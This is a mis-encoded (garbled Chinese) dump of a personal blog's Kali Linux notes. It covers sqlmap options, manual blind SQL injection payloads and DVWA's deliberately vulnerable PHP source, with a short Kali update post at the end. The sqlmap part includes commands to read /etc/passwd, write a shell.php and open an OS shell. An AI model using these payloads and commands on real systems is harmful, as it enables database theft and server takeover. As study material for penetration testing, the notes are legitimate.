<li>â€“common-columnsï¼ˆAccessç³»ç»Ÿè¡¨æ— åˆ—ä¿¡æ¯ï¼‰</li>
</ul>
<h4 id="31-SQLMAPâ€“UDF-INJECTIONï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰"><a href="#31-SQLMAPâ€“UDF-INJECTIONï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰" class="headerlink" title="31. SQLMAPâ€“UDF INJECTIONï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰"></a>31. SQLMAPâ€“UDF INJECTIONï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰</h4><ul>
<li>â€“udf-inject,â€“share-lib<ul>
<li>ç¼–è¯‘å…±äº«åº“åˆ›å»ºå¹¶ä¸Šä¼ è‡³DB Serverï¼Œä»¥æ­¤ç”ŸæˆUDFå®ç°é«˜çº§æ³¨å…¥</li>
<li>Linuxï¼šshared object</li>
<li>Windowsï¼šDLL</li>
<li><a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857" target="_blank" rel="noopener">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</a></li>
</ul>
</li>
</ul>
<h4 id="32-SQLMAPâ€“FILE-SYSTEMï¼ˆæ–‡ä»¶ç³»ç»Ÿï¼‰"><a href="#32-SQLMAPâ€“FILE-SYSTEMï¼ˆæ–‡ä»¶ç³»ç»Ÿï¼‰" class="headerlink" title="32. SQLMAPâ€“FILE SYSTEMï¼ˆæ–‡ä»¶ç³»ç»Ÿï¼‰"></a>32. SQLMAPâ€“FILE SYSTEMï¼ˆæ–‡ä»¶ç³»ç»Ÿï¼‰</h4><ul>
<li>â€“file-read=â€/etc/passwdâ€</li>
<li>â€“file-write=â€shell.phpâ€ â€“file-dest=â€/tmp/shell.phpâ€</li>
</ul>
<h4 id="33-SQLMAPâ€“OSï¼ˆæ“ä½œç³»ç»Ÿï¼‰ï¼ˆâ–²-2020-1-15å‘½ä»¤æ‰§è¡Œæ— è¿”å›æ•°æ®ï¼‰"><a href="#33-SQLMAPâ€“OSï¼ˆæ“ä½œç³»ç»Ÿï¼‰ï¼ˆâ–²-2020-1-15å‘½ä»¤æ‰§è¡Œæ— è¿”å›æ•°æ®ï¼‰" class="headerlink" title="33. SQLMAPâ€“OSï¼ˆæ“ä½œç³»ç»Ÿï¼‰ï¼ˆâ–² 2020.1.15å‘½ä»¤æ‰§è¡Œæ— è¿”å›æ•°æ®ï¼‰"></a>33. SQLMAPâ€“OSï¼ˆæ“ä½œç³»ç»Ÿï¼‰ï¼ˆâ–² 2020.1.15å‘½ä»¤æ‰§è¡Œæ— è¿”å›æ•°æ®ï¼‰</h4><ul>
<li>â€“os-cmd idï¼ˆæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼‰</li>
<li>â€“os-shell</li>
<li>â€“sql-shell</li>
<li>Mysqlã€postgresql<ul>
<li>ä¸Šä¼ å…±äº«åº“å¹¶ç”Ÿæˆsys_exec()ã€sys_eval()ä¸¤ä¸ªUDF</li>
</ul>
</li>
<li>Mssql<ul>
<li>xp_cmdshellå­˜å‚¨è¿‡ç¨‹ï¼ˆæœ‰å°±ç”¨ï¼Œç¦äº†å¯ï¼Œæ²¡æœ‰å»ºï¼‰</li>
</ul>
</li>
</ul>
<h4 id="34-SQLMAPâ€“WINDOWS-REGISTORYï¼ˆWindowsï¼‰"><a href="#34-SQLMAPâ€“WINDOWS-REGISTORYï¼ˆWindowsï¼‰" class="headerlink" title="34. SQLMAPâ€“WINDOWS REGISTORYï¼ˆWindowsï¼‰"></a>34. SQLMAPâ€“WINDOWS REGISTORYï¼ˆWindowsï¼‰</h4><ul>
<li>â€“reg-read</li>
<li>â€“reg-add</li>
<li>â€“reg-del</li>
<li>â€“reg-keyã€â€“reg-valueã€â€“reg-dataã€â€“reg-type</li>
<li>sqlmap â€“u=â€<a href="http://1.1.1.1/a.aspx?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.aspx?id=1&quot;</a> â€“reg-add â€“regkey=â€HKEY_LOCAL_MACHINE\SOFTWARE\sqlmapâ€ â€“reg-value=Test -reg-type=REG_SZ â€“reg-data=1</li>
</ul>
<h4 id="35-SQLMAPâ€“GENERALï¼ˆä¸€èˆ¬æ€§å‚æ•°ï¼‰"><a href="#35-SQLMAPâ€“GENERALï¼ˆä¸€èˆ¬æ€§å‚æ•°ï¼‰" class="headerlink" title="35. SQLMAPâ€“GENERALï¼ˆä¸€èˆ¬æ€§å‚æ•°ï¼‰"></a>35. SQLMAPâ€“GENERALï¼ˆä¸€èˆ¬æ€§å‚æ•°ï¼‰</h4><ul>
<li>-sï¼ˆsqliteä¼šè¯æ–‡ä»¶ä¿å­˜ä½ç½®ï¼‰</li>
<li>-tï¼ˆè®°å½•æµé‡æ–‡ä»¶ä¿å­˜ä½ç½®ï¼‰</li>
<li>â€“charsetï¼ˆå¼ºåˆ¶å­—ç¬¦ç¼–ç ï¼‰<ul>
<li>â€“charset=GBK</li>
</ul>
</li>
<li>â€“crawlï¼ˆä»èµ·å§‹ä½ç½®çˆ¬ç«™æ·±åº¦ï¼‰<ul>
<li>â€“batch â€“crawl=3</li>
</ul>
</li>
<li>â€“csv-delï¼ˆdumpæ•°æ®é»˜è®¤å­˜äºâ€,â€åˆ†å‰²çš„CSVæ–‡ä»¶ï¼ŒæŒ‡å®šå…¶ä»–åˆ†éš”ç¬¦ï¼‰<ul>
<li>â€“csv-del=â€;â€</li>
</ul>
</li>
<li>â€“dbms-credï¼ˆæŒ‡å®šæ•°æ®åº“è´¦å·ï¼‰</li>
<li>â€“flush-sessionï¼ˆæ¸…ç©ºsessionï¼‰</li>
<li>â€“force-sslï¼ˆhttpsé“¾æ¥ï¼‰</li>
<li>â€“fresh-queriesï¼ˆå¿½ç•¥sessionæŸ¥è¯¢ç»“æœï¼‰</li>
<li>â€“hexï¼ˆdumpéASCIIç å­—ç¬¦å†…å®¹æ—¶ï¼Œå°†å…¶ç¼–ç ä¸º16è¿›åˆ¶å½¢å¼ï¼Œæ”¶åˆ°åè§£ç è¿˜åŸï¼Œé˜²è¿‡æ»¤ï¼‰<ul>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/s.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/s.php?id=1&quot;</a> â€“hex -v 3</li>
</ul>
</li>
<li>â€“output-dir=/tmp</li>
<li>â€“parse-errorsï¼ˆåˆ†æå’Œç°å®æ•°æ®åº“å†…å»ºæŠ¥é”™ä¿¡æ¯ï¼‰<ul>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/sqlmap/a.asp?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/sqlmap/a.asp?id=1&quot;</a> â€“parse-errors</li>
</ul>
</li>
<li>â€“saveï¼ˆå°†å‘½ä»¤ä¿å­˜æˆé…ç½®æ–‡ä»¶ï¼‰</li>
</ul>
<h4 id="36-SQLMAPâ€“MISCELLANEOUS-â†’-åŠ©è®°ç¬¦ï¼ˆ-zï¼‰"><a href="#36-SQLMAPâ€“MISCELLANEOUS-â†’-åŠ©è®°ç¬¦ï¼ˆ-zï¼‰" class="headerlink" title="36. SQLMAPâ€“MISCELLANEOUS â†’ åŠ©è®°ç¬¦ï¼ˆ-zï¼‰"></a>36. SQLMAPâ€“MISCELLANEOUS â†’ åŠ©è®°ç¬¦ï¼ˆ-zï¼‰</h4><ul>
<li>-zï¼ˆå‚æ•°åŠ©è®°ç¬¦ï¼‰</li>
<li>åŸï¼šsqlmap â€“batch â€“random-agent â€“ignore-proxy â€“technique=BEU -u â€œ<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
<li>åï¼šsqlmap -z â€œbat,randoma,ign,tec=BEUâ€ -u â€œ<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
<li>åŸï¼šsqlmap â€“ignore-proxy â€“flush-session â€“technique=U â€“dump -D testdb -T users -u â€œ1.1.1.1/a.php?id=1â€ </li>
<li>åï¼šsqlmap -z â€œign,flu,bat,tec=U,dump,D=testdb,T=usersâ€ -u â€œ1.1.1.1/ vuln.php?id=1â€</li>
</ul>
<h4 id="37-SQLMAPâ€“MISCELLANEOUS-â†’-answer-check-waf-hpp-identify-wafï¼ˆâ–²-2020-1-15å‘½ä»¤æ‰§è¡Œæ— è¿”å›æ•°æ®ï¼‰"><a href="#37-SQLMAPâ€“MISCELLANEOUS-â†’-answer-check-waf-hpp-identify-wafï¼ˆâ–²-2020-1-15å‘½ä»¤æ‰§è¡Œæ— è¿”å›æ•°æ®ï¼‰" class="headerlink" title="37. SQLMAPâ€“MISCELLANEOUS â†’ answer/check-waf/hpp/identify-wafï¼ˆâ–² 2020.1.15å‘½ä»¤æ‰§è¡Œæ— è¿”å›æ•°æ®ï¼‰"></a>37. SQLMAPâ€“MISCELLANEOUS â†’ answer/check-waf/hpp/identify-wafï¼ˆâ–² 2020.1.15å‘½ä»¤æ‰§è¡Œæ— è¿”å›æ•°æ®ï¼‰</h4><ul>
<li>â€“answer<ul>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> â€“technique=E â€“answers=â€extending=Nâ€ â€“batch</li>
</ul>
</li>
<li>â€“check-wafï¼ˆæ£€æµ‹WAF/IPS/IDSï¼‰ï¼ˆâ–² 2020.1.15æ­¤å‚æ•°æ›´æ–°åæš‚æ— ï¼‰</li>
<li>â€“hppï¼ˆHTTP parameter pollutionï¼ŒWeb Applicationçš„ä¸€ä¸ªæ¼æ´ï¼‰<ul>
<li>ç»•è¿‡WAF/IPS/IDSçš„æœ‰æ•ˆæ–¹æ³•</li>
<li>å°¤å…¶å¯¹ASP/IISå’ŒASP.NET/IIS</li>
</ul>
</li>
<li>â€“identify-wafï¼ˆå½»åº•çš„waf/ips/idsæ£€æŸ¥ï¼‰<ul>
<li>æ£€æŸ¥30å¤šç§äº§å“</li>
</ul>
</li>
</ul>
<h4 id="38-SQLMAPâ€“MISCELLANEOUS-â†’-Misc"><a href="#38-SQLMAPâ€“MISCELLANEOUS-â†’-Misc" class="headerlink" title="38. SQLMAPâ€“MISCELLANEOUS â†’ Misc"></a>38. SQLMAPâ€“MISCELLANEOUS â†’ Misc</h4><ul>
<li>â€“mobileï¼ˆæ¨¡æ‹Ÿæ™ºèƒ½æ‰‹æœºè®¾å¤‡ï¼‰</li>
<li>â€“purge-outputï¼ˆæ¸…é™¤outputæ–‡ä»¶å¤¹ï¼‰ï¼ˆâ–² 2020.1.15ä¿®æ”¹å‚æ•°ä¸ºâ€“purgeï¼‰</li>
<li>â€“smartï¼ˆå½“æœ‰å¤§é‡æ£€æµ‹ç›®æ ‡æ—¶ï¼Œåªé€‰æ‹©åŸºäºé”™è¯¯çš„æ£€æµ‹ç»“æœï¼‰</li>
<li>â€“wizardï¼ˆsqlmapå‘å¯¼ï¼‰</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/" itemprop="url">Kali Linuxç¬”è®°(äº”å)ï¼šæ‰‹åŠ¨æ¼æ´æŒ–æ˜--SQLç›²æ³¨</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-14T20:12:46+08:00">
                2020-01-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-åˆ¤æ–­æŠ€æœ¯"><a href="#1-åˆ¤æ–­æŠ€æœ¯" class="headerlink" title="1. åˆ¤æ–­æŠ€æœ¯"></a>1. åˆ¤æ–­æŠ€æœ¯</h4><ul>
<li>ä¸æ˜¾ç¤ºæ•°æ®åº“å†…å»ºçš„æŠ¥é”™ä¿¡æ¯<ul>
<li>å†…å»ºçš„æŠ¥é”™ä¿¡æ¯å¸®åŠ©å¼€å‘äººå‘˜å‘ç°å’Œä¿®å¤é—®é¢˜</li>
<li>æŠ¥é”™ä¿¡æ¯æä¾›å…³äºç³»ç»Ÿçš„å¤§é‡æœ‰ç”¨ä¿¡æ¯</li>
</ul>
</li>
<li>å½“ç¨‹åºå‘˜éšè—äº†æ•°æ®åº“å†…å»ºæŠ¥é”™ä¿¡æ¯ï¼Œæ›¿æ¢ä¸ºé€šç”¨çš„é”™è¯¯æç¤ºï¼Œsqlæ³¨å…¥å°†æ— æ³•ä¾æ®æŠ¥é”™ä¿¡æ¯åˆ¤æ–­æ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œå³ä¸ºç›²æ³¨</li>
<li>æ€è·¯ï¼šæ—¢ç„¶æ— æ³•åŸºäºæŠ¥é”™ä¿¡æ¯åˆ¤æ–­ç»“æœï¼ŒåŸºäºé€»è¾‘çœŸå‡çš„ä¸åŒç»“æœæ¥åˆ¤æ–­<ul>
<li>1â€™ and 1=1â€“+</li>
<li>1â€™ and 1=2â€“+</li>
<li>1â€™ order by 5â€“+  å‡</li>
<li>1â€™ order by 2â€“+  çœŸ</li>
<li>1â€™ union select 1,2â€“+</li>
<li>1â€™ union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())â€“+</li>
<li>1â€™ and 1=0 union select null,table_name from information_schema.tables#</li>
<li>1â€™ and 1=0 union selcet null,table_name from information_schema.colums where table_name=â€™usersâ€™#</li>
</ul>
</li>
</ul>
<h4 id="2-çŒœå­—æ®µâ€“æ— information-scheme"><a href="#2-çŒœå­—æ®µâ€“æ— information-scheme" class="headerlink" title="2. çŒœå­—æ®µâ€“æ— information_scheme"></a>2. çŒœå­—æ®µâ€“æ— information_scheme</h4><ul>
<li>æ— æƒè¯»å–information_shcemaåº“/æ‹’ç»unionã€order byè¯­å¥<ul>
<li>çŒœåˆ—åï¼š1â€™ and user is not nullâ€“+</li>
<li>çŒœå½“å‰è¡¨åï¼š1â€™ and table.user is not nullâ€“+</li>
<li>çŒœåº“é‡Œå…¶ä»–è¡¨ï¼š1â€™ and (select count() from table)&gt;0â€“+</li>
<li>åˆ—è¡¨å¯¹åº”å…³ç³»ï¼š1â€™ and users.user is not nullâ€“+</li>
<li>çŒœå­—æ®µå†…å®¹ï¼š1â€™ and user=â€™adminâ€™/1â€™ or user like â€˜%aâ€™</li>
<li>çŒœè´¦å·å¯¹åº”å¯†ç ï¼š2â€™ or user=â€™adminâ€™ and password=â€™5f4dcc3b5aa765d61d8327deb832cf99</li>
<li>â–² Burpsuiteè‡ªåŠ¨åŒ–çŒœè§£å†…å®¹</li>
</ul>
</li>
</ul>
<h4 id="3-çœŸå®å®ä¾‹"><a href="#3-çœŸå®å®ä¾‹" class="headerlink" title="3. çœŸå®å®ä¾‹"></a>3. çœŸå®å®ä¾‹</h4><ul>
<li>å¼€ä¸ªè„‘æ´<ul>
<li>çœŸå®æ¡ˆä¾‹ï¼šæŸç”µå•†ç½‘ç«™</li>
<li><a href="http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123" target="_blank" rel="noopener">http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123</a></li>
<li>and 1=1â€“+  æ˜¾ç¤ºä¸€åŒ…é¢å·¾çº¸</li>
<li>and 1-2â€“+  æ˜¾ç¤ºä¸€è¢‹æ´—è¡£ç²‰</li>
<li>1â€™ and ORD(MID((VERSION()),1,1))&amp;ï¼ˆ1/2/4/8/16/32/64/128ï¼‰&gt;0â€“+</li>
<li>CURRENT_USER()ã€DATABASE()</li>
<li>MIDç”¨æ³•ï¼šMID(ColumnName,Start [,Length])</li>
<li>ORDç”¨æ³•ï¼šORD(string)   #ASCIIç </li>
</ul>
</li>
</ul>
<h4 id="4-DVWAçš„SQLç›²æ³¨æºç "><a href="#4-DVWAçš„SQLç›²æ³¨æºç " class="headerlink" title="4. DVWAçš„SQLç›²æ³¨æºç "></a>4. DVWAçš„SQLç›²æ³¨æºç </h4><ul>
<li>DVWAçš„SQL Injection(Blind) Sourceï¼ˆLowï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWAçš„SQL Injection(Blind) Sourceï¼ˆMediumï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line">    </span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first=mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last=mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWAçš„SQL Injection(Blind) Sourceï¼ˆHighï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id)) &#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">        $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/" itemprop="url">Kali Linuxç¬”è®°(å››åå…«)ï¼šKali Linuxç‰ˆæœ¬æ›´æ–°--rolling</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:35+08:00">
                2020-01-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Kali-Linuxç‰ˆæœ¬æ›´æ–°â€“ç¬¬ä¸€ä¸ªRolling-RELEASE"><a href="#1-Kali-Linuxç‰ˆæœ¬æ›´æ–°â€“ç¬¬ä¸€ä¸ªRolling-RELEASE" class="headerlink" title="1. Kali Linuxç‰ˆæœ¬æ›´æ–°â€“ç¬¬ä¸€ä¸ªRolling RELEASE"></a>1. Kali Linuxç‰ˆæœ¬æ›´æ–°â€“ç¬¬ä¸€ä¸ªRolling RELEASE</h4><ul>
<li>Kali 2.0å‘å¸ƒæ—¶å£°ç§°å°†é‡‡ç”¨rolling releaseæ¨¡å¼æ›´æ–°ï¼ˆä½†å¹¶æœªå®æ–½ï¼‰</li>
<li>Fixed-release<ul>
<li>å›ºå®šå‘å¸ƒå‘¨æœŸ</li>
<li>ä½¿ç”¨è½¯ä»¶ç¨³å®šçš„ä¸»æµç‰ˆæœ¬ï¼ˆå‘å¸ƒâ€“ä¸»æµâ€“ä½œåºŸï¼‰</li>
<li>æ›´ç¨³å®šï¼Œé€‚åˆäºä¼ä¸šç”Ÿæˆç¯å¢ƒ</li>
</ul>
</li>
<li>Rolling release<ul>
<li>é€‚ç”¨äºå¼€å‘è€…å’ŒæŠ€æœ¯äººå‘˜</li>
<li>è¿ç»­å‡çº§æ–°ç‰ˆæœ¬ï¼Œè¿½æ±‚åœ¨æ–°åŠŸèƒ½å‡ºç°åæœ€å¿«ä½¿ç”¨</li>
<li>æ­£å¼æˆä¸ºæµè¡Œ</li>
</ul>
</li>
<li>Kali 2.0 rolling release<ul>
<li>é‡‡ç”¨debian testingåº“ä½œä¸ºæ›´æ–°æº</li>
</ul>
</li>
<li>è½¯ä»¶åŒ…è¿½è¸ª<ul>
<li><a href="https://pkg.kali.org/" target="_blank" rel="noopener">https://pkg.kali.org/</a></li>
</ul>
</li>
<li>VMware Tools vs Open-VM-Tools<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šapt-get install open-vm-tools-desktop fuse</code></strong></li>
</ul>
</li>
<li>Gnome 3.18</li>
<li>4.3å†…æ ¸</li>
<li>Kali 2.0ç°æœ‰ç‰ˆæœ¬å‡çº§</li>
</ul>
<blockquote>
<pre><code>â­ç°æœ‰ç‰ˆæœ¬æ›´æ–°
cat &lt;&lt; EOF &gt; /etc/apt/sources.list
deb http://http.kali.org/kali kali-rolling main non-free contrib
EOF

â­å®‰è£…å‘½ä»¤
apt-get update
apt-get dist-upgrade 
reboot

